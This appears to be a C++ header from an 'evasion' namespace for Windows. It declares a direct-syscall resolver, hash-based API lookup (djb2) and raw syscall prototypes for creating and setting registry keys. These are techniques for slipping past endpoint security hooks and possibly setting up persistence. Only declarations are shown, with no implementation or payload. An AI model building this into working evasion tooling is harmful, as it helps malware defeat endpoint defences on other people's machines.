#pragma once
#include <windows.h>
#include <map>
#include <string>
#include <vector>
#include <winternl.h>

namespace evasion {

struct SyscallStub {
    DWORD ssn;
    PVOID address;
};

class SyscallResolver {
public:
    static SyscallResolver& GetInstance();
    DWORD GetServiceNumber(const std::string& functionName);
    PVOID GetSyscallGadget();

private:
    SyscallResolver();
    void ResolveAll();
    std::map<std::string, DWORD> m_syscallMap;
    PVOID m_syscallGadget = nullptr;
};

// --- These must be INSIDE the namespace block ---
unsigned long djb2Hash(const char* str);
FARPROC getProcByHash(HMODULE hModule, unsigned long targetHash);

extern "C" NTSTATUS InternalDoSyscall(DWORD ssn, ...);

extern "C" NTSTATUS NtCreateKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG TitleIndex,
    IN PUNICODE_STRING Class,
    IN ULONG CreateOptions,
    OUT PULONG Disposition
);

extern "C" NTSTATUS NtSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN ULONG TitleIndex,
    IN ULONG Type,
    IN PVOID Data,
    IN ULONG DataSize
);

extern "C" NTSTATUS NtClose(
    IN HANDLE Handle
);
// -----------------------------------------------

} // namespace evasion
